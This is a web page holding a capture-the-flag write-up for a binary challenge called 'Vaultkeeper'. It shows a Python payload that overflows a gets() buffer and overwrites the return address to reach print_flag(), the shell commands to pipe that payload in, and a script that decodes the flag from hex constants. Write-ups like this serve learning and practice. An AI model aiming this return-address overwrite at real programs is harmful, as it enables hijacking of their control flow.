
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Ethical hacking writeups, CTF challenges, and cybersecurity notes.">
      
      
      
      
      
      
        
      
      
      <link rel="icon" href="../../../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>Vaultkeeper - Cybersecurity Portfolio</title>
      
    
    
      <link rel="stylesheet" href="../../../../../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#description" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../../../.." title="Cybersecurity Portfolio" class="md-header__button md-logo" aria-label="Cybersecurity Portfolio" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cybersecurity Portfolio
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Vaultkeeper
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to hacker mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to hacker mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../../.." class="md-tabs__link">
        
  
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../../../about/" class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../" class="md-tabs__link">
          
  
  
  Competitions

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../../platforms/" class="md-tabs__link">
          
  
  
  Platforms

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../../../.." title="Cybersecurity Portfolio" class="md-nav__button md-logo" aria-label="Cybersecurity Portfolio" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Cybersecurity Portfolio
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../../about/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    About
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Competitions
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Competitions
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Platforms
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Platforms
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../platforms/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Overview
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#description" class="md-nav__link">
    <span class="md-ellipsis">
      
        Description
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hint" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hint
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solution
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Solution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#code-summary" class="md-nav__link">
    <span class="md-ellipsis">
      
        Code Summary
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exploitation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#step-1-determine-the-offset-to-the-return-address" class="md-nav__link">
    <span class="md-ellipsis">
      
        Step 1: Determine the Offset to the Return Address
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-2-find-the-address-of-print_flag" class="md-nav__link">
    <span class="md-ellipsis">
      
        Step 2: Find the Address of print_flag()
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-3-craft-the-payload" class="md-nav__link">
    <span class="md-ellipsis">
      
        Step 3: Craft the Payload
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-4-run-the-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Step 4: Run the Exploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#how-the-above-python-code-works" class="md-nav__link">
    <span class="md-ellipsis">
      
        How the above python code works:
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Vaultkeeper</h1>

<h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
<p>The vaulkeeper has learned from Bufferland's mistakes. No longer does he leave the flag out in the pen. He mocks your tools, your reliance on strings, and your lazy static analysis. But the flaw still lies within - hidden, yes, but not unreachable. To reveal the secret now, you must force the keeper to construct it.</p>
<hr />
<h2 id="hint">Hint<a class="headerlink" href="#hint" title="Permanent link">&para;</a></h2>
<p>"The flag is real, but not revealed - until you walk the path unwritten."
You won't see it, but you can still reach it.
Try harder</p>
<hr />
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
<p>This challenge appeared to be a follow-up to the previous Bufferland task, so I expected another binary exploitation scenario.</p>
<p>I started by making the binary executable and running it</p>
<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span>+x<span class="w"> </span>glory

./glory
</code></pre></div>
<p><img alt="glory" src="../assets/glory.png" /></p>
<p>The program greeted me, asked for input, and then ended with “The vault remains sealed.” Trying simple input didn’t reveal anything.</p>
<p>Next, I ran <code>strings</code> and explored the binary in Cutter, but found nothing useful. I then turned to <code>Ghidra</code> for a deeper look</p>
<p>Before I even continue to get the flag, I analyzed the codes in the binary and made a notice</p>
<p>There are 4 functions here that we need to analyze : intro, main, print_flag and vulnerable</p>
<p><img alt="functions" src="../assets/functions.png" /></p>
<h3 id="code-summary">Code Summary<a class="headerlink" href="#code-summary" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><code>intro()</code> prints the welcome messages.</p>
</li>
<li>
<p><code>vulnerable()</code> reads user input but does not print the flag.</p>
</li>
<li>
<p><code>main()</code> calls <code>intro()</code>, then <code>vulnerable()</code>, and finally prints "The vault remains sealed."</p>
</li>
<li>
<p>The flag is printed only by <code>print_flag()</code>, which is never called directly in <code>main()</code>.</p>
</li>
</ul>
<p>What this means is that the program expects an input, but no input alone will cause the flag to be printed. </p>
<p>print_flag function :</p>
<p><img alt="print_flag" src="../assets/print_flag.png" /></p>
<p>vulnerable function:</p>
<p><img alt="vulnerable" src="../assets/vulnerable.png" /></p>
<p>To get the flag output, you need to exploit the buffer overflow vulnerability in <code>vulnerable()</code> (because it uses <code>gets()</code> unsafely) to overwrite the return address and redirect execution to the <code>print_flag()</code> function.</p>
<p>This is a classic binary exploitation scenario where you provide a crafted input (payload) that overflows the buffer and hijacks control flow.</p>
<h3 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h3>
<h4 id="step-1-determine-the-offset-to-the-return-address">Step 1: Determine the Offset to the Return Address<a class="headerlink" href="#step-1-determine-the-offset-to-the-return-address" title="Permanent link">&para;</a></h4>
<p>The buffer size is 64 bytes. On a typical x86_64 system, the return address is located after the buffer and the saved frame pointer (RBP). Therefore, the offset to the return address is:</p>
<h4 id="step-2-find-the-address-of-print_flag">Step 2: Find the Address of <code>print_flag()</code><a class="headerlink" href="#step-2-find-the-address-of-print_flag" title="Permanent link">&para;</a></h4>
<p>Use a tool like <code>objdump</code>, <code>nm</code>, or Ghidra to find the memory address of the <code>print_flag()</code> function. For example:</p>
<div class="highlight"><pre><span></span><code>nm<span class="w"> </span>-C<span class="w"> </span>./glory<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>print_flag
</code></pre></div>
<p><img alt="nm" src="../assets/nm.png" /></p>
<h4 id="step-3-craft-the-payload">Step 3: Craft the Payload<a class="headerlink" href="#step-3-craft-the-payload" title="Permanent link">&para;</a></h4>
<p>Create a payload that overflows the buffer and overwrites the return address with the address of <code>print_flag()</code>. Here's a Python script to generate the payload:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>

<span class="c1"># Define the sizes and addresses</span>
<span class="n">buffer_size</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">saved_rbp_size</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x401199</span>  <span class="c1"># Place the actual print_flag address</span>

<span class="c1"># Craft the payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">buffer_size</span>       <span class="c1"># Fill the buffer with &#39;A&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="n">saved_rbp_size</span>   <span class="c1"># Overwrite the saved RBP with &#39;B&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>    <span class="c1"># Overwrite the return address with print_flag address (little endian)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<h4 id="step-4-run-the-exploit">Step 4: Run the Exploit<a class="headerlink" href="#step-4-run-the-exploit" title="Permanent link">&para;</a></h4>
<p>Save the payload to a file or pipe it into the program. For example:</p>
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>exploit.py<span class="w"> </span>&gt;<span class="w"> </span>payload
./glory<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<p>Or directly pipe the output:</p>
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>exploit.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>./glory
</code></pre></div>
<p><img alt="exploit" src="../assets/exploit.png" /></p>
<p>It however did not work because the exploit had an issue. Pending creation of the exploit, I knew that the flag is stored in the print_flag function, but it is encoded as a series of 64-bit hexadecimal values assigned to local variables, then printed as a flag as a string
The values represent parts of the flag in memory. To find the flag, you need to convert these hex values into ASCII characters and concatenate them.</p>
<p><strong>NB  :  You need to convert the hexadecimal values into little-endian byte order</strong> because that is how the data is stored in memory of the target machine (which is almost certainly a little-endian architecture like x86 or x86_64)</p>
<p>I thus created a script which will decode the flag from the hexadecimal values you provided, following the little-endian byte order, and prints out the full flag.</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">decode_flag</span><span class="p">():</span>
    <span class="c1"># Hex values from the print_flag function</span>
    <span class="n">hex_values</span> <span class="o">=</span> <span class="p">[</span>
        <span class="mh">0x5f306e7b67616c66</span><span class="p">,</span>
        <span class="mh">0x77306c6672337630</span><span class="p">,</span>
        <span class="mh">0x72306c675f306e5f</span><span class="p">,</span>
        <span class="mh">0x7d79</span>
    <span class="p">]</span>

    <span class="n">flag_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>

    <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">hex_values</span><span class="p">:</span>
        <span class="c1"># Determine how many bytes to extract (8 bytes for full 64-bit values, less for the last)</span>
        <span class="n">length</span> <span class="o">=</span> <span class="mi">8</span> <span class="k">if</span> <span class="n">val</span> <span class="o">&gt;</span> <span class="mh">0xFFFF</span> <span class="k">else</span> <span class="mi">2</span>

        <span class="c1"># Convert the integer to bytes in little-endian order</span>
        <span class="n">flag_bytes</span> <span class="o">+=</span> <span class="n">val</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="c1"># Decode the concatenated bytes to ASCII string</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Decoded flag:&quot;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">decode_flag</span><span class="p">()</span>
</code></pre></div>
<p><img alt="decode" src="../assets/decode.png" /></p>
<hr />
<div class="highlight"><pre><span></span><code>Flag : flag{n0_0v3rfl0w_n0_gl0ry}
</code></pre></div>
<h4 id="how-the-above-python-code-works">How the above python code works:<a class="headerlink" href="#how-the-above-python-code-works" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p>Each 64-bit integer is converted to bytes in little-endian byte order.</p>
</li>
<li>
<p>The last value is shorter (only 2 bytes).</p>
</li>
<li>
<p>All bytes are concatenated and decoded to ASCII.</p>
</li>
<li>
<p>The script prints the decoded flag.</p>
</li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.sections", "header.autohide", "content.code.copy", "content.action.edit", "content.code.annotate", "navigation.top", "palette.toggle"], "search": "../../../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>